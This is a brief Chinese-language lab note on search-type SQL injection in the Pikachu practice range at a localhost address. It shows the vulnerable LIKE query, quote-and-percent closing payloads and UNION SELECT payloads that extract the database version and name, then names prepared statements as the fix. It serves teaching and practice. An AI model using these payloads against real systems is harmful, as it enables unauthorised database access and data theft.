# Pikachu | SQL注入 搜索型注入
## 一、漏洞简介
搜索框使用 like '%xxx%' 查询，需要%和单引号闭合。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/sqli/sqli_search.php
## 三、复现步骤
1. 输入a' 报错；原SQL：`select * from user where username like '%$name%'`
2. 闭合payload：`a' and 1=1 -- %`
3. 联合查询脱库：`a' union select 1,version() -- %`
## 四、Payload
`a' union select 1,database() -- %`
## 五、漏洞原理
like模糊查询，参数放在%%中间，注入时需要闭合%和单引号。
## 六、修复方案
预编译查询。
## 七、总结
搜索型注入记住：% 也要考虑闭合。